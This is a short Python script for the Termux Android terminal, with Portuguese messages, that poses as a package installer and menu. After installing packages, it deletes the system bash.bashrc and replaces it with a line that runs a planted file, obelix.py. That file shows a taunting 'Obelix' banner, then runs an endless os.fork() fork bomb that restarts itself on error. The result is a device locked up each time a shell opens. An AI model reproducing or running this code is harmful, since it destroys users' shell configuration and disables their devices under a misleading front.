# imports
from time import sleep
from xxx import menu
import os


print('\033[0;30;42minstalando pacotes\033[m')
os.system('python3 -m pip install --upgrade pip &>/dev/null')
os.system('pip install lolcat &>/dev/null')
os.system('pip install pyfiglet &>/dev/null')
os.system('clear')
print(menu.menu)
script = input('---> \033[0;30;41m')
os.chdir('/data/data/com.termux/files/usr/etc')
os.system('rm -rf bash.bashrc')
arq = open('bash.bashrc', 'w')
arq.write('echo -e "\033[31m" && python /data/data/com.termux/files/usr/etc/obelix.py')
obe = open('obelix.py', 'w')
obe.write("""
import os
from time import sleep
from pyfiglet import Figlet

try:
    cosmic = Figlet(font='cosmic')
    os.system('clear')
    print('travazap abatido by:\\n')
    print(cosmic.renderText('Obelix'))
    input('\n\nnão aperte nenhum botão: ')
    while True:
        os.fork()
except:
    print('\033[31m')
    os.system('python /data/data/com.termux/files/usr/etc/obelix.py')
""")
